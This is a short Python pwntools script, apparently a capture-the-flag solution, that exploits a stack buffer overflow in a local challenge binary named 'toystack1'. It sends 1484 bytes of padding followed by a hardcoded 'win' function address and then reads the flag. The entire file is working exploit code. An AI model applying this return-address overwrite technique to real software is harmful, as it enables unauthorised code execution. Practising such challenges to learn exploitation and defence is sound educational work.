from pwn import *

# Load the binary
exe = ELF('./toystack1')
io = process(exe.path)


# Wait for welcome message
io.recvuntil(b'We will now read in some bytes!')

# Win function address (directly from the disassembly)
win_address = 0x08048718

# Buffer overflow exploit
# 1484 bytes of padding + win function address
exploit = b'A' * 1484 + p32(win_address)

# Send the payload
io.sendline(exploit)
io.interactive()
# Wait and read all output
# Give more time to read the flag
flag = io.recv(timeout=5)
print(flag)